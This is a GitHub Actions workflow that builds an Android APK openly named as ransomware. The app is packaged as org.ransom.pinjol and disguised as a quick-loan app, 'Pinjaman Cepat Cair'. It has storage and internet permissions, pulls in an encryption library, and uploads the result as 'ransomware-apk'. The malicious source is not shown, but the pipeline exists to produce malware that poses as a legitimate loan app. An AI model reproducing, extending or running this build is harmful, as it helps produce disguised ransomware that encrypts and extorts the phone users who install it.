name: Build Ransomware APK

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-22.04
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.9'

      - name: Set up Java 17 (WAJIB!)
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'
          java-package: jdk

      - name: Verify Java version
        run: |
          java -version
          javac -version
          echo $JAVA_HOME

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            python3-pip \
            git \
            zip \
            unzip \
            wget \
            curl \
            autoconf \
            libtool \
            pkg-config \
            zlib1g-dev \
            libncurses5-dev \
            libncursesw5-dev \
            libtinfo5 \
            cmake \
            libffi-dev \
            libssl-dev \
            build-essential

      - name: Install Python dependencies
        run: |
          pip install --upgrade pip
          pip install --upgrade setuptools wheel
          pip install cython virtualenv
          pip install buildozer python-for-android
          pip install pycryptodome requests kivy==2.1.0

      - name: Setup Android SDK
        run: |
          mkdir -p $HOME/android-sdk
          cd $HOME/android-sdk
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
          unzip -q commandlinetools-linux-11076708_latest.zip
          rm commandlinetools-linux-11076708_latest.zip
          mkdir -p cmdline-tools/latest
          mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
          
          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH
          echo "$HOME/android-sdk/platform-tools" >> $GITHUB_PATH

      - name: Accept Android licenses (with Java 17)
        run: |
          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses || true

      - name: Install SDK components (with Java 17)
        run: |
          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-31" "build-tools;31.0.0"

      - name: Build APK
        run: |
          p4a apk \
            --private . \
            --package=org.ransom.pinjol \
            --name="Pinjaman Cepat Cair" \
            --version=1.0 \
            --bootstrap=sdl2 \
            --requirements=python3,kivy==2.1.0,requests,pycryptodome \
            --permission INTERNET \
            --permission READ_EXTERNAL_STORAGE \
            --permission WRITE_EXTERNAL_STORAGE \
            --arch=arm64-v8a \
            --arch=armeabi-v7a \
            --release

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: ransomware-apk
          path: ./*.apk